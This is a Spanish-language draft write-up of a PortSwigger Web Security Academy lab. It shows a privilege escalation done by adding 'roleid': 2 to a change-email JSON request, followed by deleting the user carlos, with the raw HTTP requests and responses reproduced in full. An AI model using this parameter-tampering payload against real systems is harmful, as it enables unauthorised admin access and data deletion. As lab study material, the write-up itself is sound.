# 👻 BORRADOR

Este laboratorio tiene un panel de administración en /admin. Solo es accesible para usuarios que hayan iniciado sesión con un roleidpuntaje de 2.

Resuelva el laboratorio accediendo al panel de administración y usándolo para eliminar al usuario carlos.

Puede iniciar sesión en su propia cuenta utilizando las siguientes credenciales:wiener:peter



RESOLUCIÓN:

BIEN RESOLVIMOS EL LABORATORIO MODIFICANDO EL ENVIO DE DATOS EN JSON EN LA SOLICITUD DE CAMBIAR MAIL, POR QU VIMOS QUE NOS RESPONDIA EN JSON CON NUESTRA INFO DE MAIL Y USUARIO WUIENER Y TAMBIUEN CON EL ROLE 1 Y SABIAMOS QUE DEBIAMOS CAMBIAR AL ROLE 2 EL CUAL ES EL DE ADMIN, POR LO QUE USAMOS ESTA MIOSMA SOLICITUD POR METODO POST AGREGANDO NO SOLO EL CAMBIO DE MAIL SI NO QUE TAMBIEN AGREMAOS EL CAMBIO DE ROLE A 2 EN LA DATA QUE ENVIAMOS POR JSON, CONSIGUIENDO ASI EL ROLE DE ADMIN Y PODER SOLICITAR EL ACCESO DEL PANEL ADMIN Y BORRAR AL POBRE CARLITOS.

```python
// pyth

---------------



PAYLOAD QUE SE CARGO PARA ADQUIRIR EL ROLE DE ADMIN:



{
  "username": "wiener",
  "email": "wiener@admin-user.net",
  "apikey": "mCWrs22XXVYcusJ6MFVySGKx5lyoBhw9",
  "roleid": 2
}





--------


REQUEST NORMAL:






POST /my-account/change-email HTTP/2
Host: 0a51007e04b3456f832a50d500c10075.web-security-academy.net
Cookie: session=e14fx4oisOcKG3CYXwruhPRK9KfZKaEe
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 33
Origin: https://0a51007e04b3456f832a50d500c10075.web-security-academy.net
Referer: https://0a51007e04b3456f832a50d500c10075.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"email":"wiener@admin-user.net"}





RESPONSE NORMAL:





HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 125

{
  "username": "wiener",
  "email": "wiener@admin-user.net",
  "apikey": "mCWrs22XXVYcusJ6MFVySGKx5lyoBhw9",
  "roleid": 1
}




-------------



RESQUEST CON PAYLOAD:




POST /my-account/change-email HTTP/2
Host: 0a51007e04b3456f832a50d500c10075.web-security-academy.net
Cookie: session=e14fx4oisOcKG3CYXwruhPRK9KfZKaEe
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 33
Origin: https://0a51007e04b3456f832a50d500c10075.web-security-academy.net
Referer: https://0a51007e04b3456f832a50d500c10075.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{
  "username": "wiener",
  "email": "wiener@admin-user.net",
  "apikey": "mCWrs22XXVYcusJ6MFVySGKx5lyoBhw9",
  "roleid": 2
}


------------------


RESPONSE CON PAYLOAD:


HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 125

{
  "username": "wiener",
  "email": "wiener@admin-user.net",
  "apikey": "mCWrs22XXVYcusJ6MFVySGKx5lyoBhw9",
  "roleid": 2
}




URL:

https://0a51007e04b3456f832a50d500c10075.web-security-academy.net/admin


--------------------




REQUEST ELIMINANDO A CARLITOS:



GET /admin/delete?username=carlos HTTP/2
Host: 0a51007e04b3456f832a50d500c10075.web-security-academy.net
Cookie: session=e14fx4oisOcKG3CYXwruhPRK9KfZKaEe
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: https://0a51007e04b3456f832a50d500c10075.web-security-academy.net
Referer: https://0a51007e04b3456f832a50d500c10075.web-security-academy.net/my-account/change-email
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers




------



RESPONSE ELIMINANDO A CARLITOS:




HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 6139

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>User role can be modified in user profile</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>User role can be modified in user profile</h2>
                            <a class=link-back href='https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved-hidden>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aUser+role+can+be+modified+in+user+profile%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2faccess-control%2flab-user-role-can-be-modified-in-user-profile&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2faccess-control%2flab-user-role-can-be-modified-in-user-profile'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>

            <script src='/resources/labheader/js/completedLabHeader.js'></script>        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <p>User deleted successfully!</p>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                    </section>
                    <br>
                    <hr>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>






----------
```

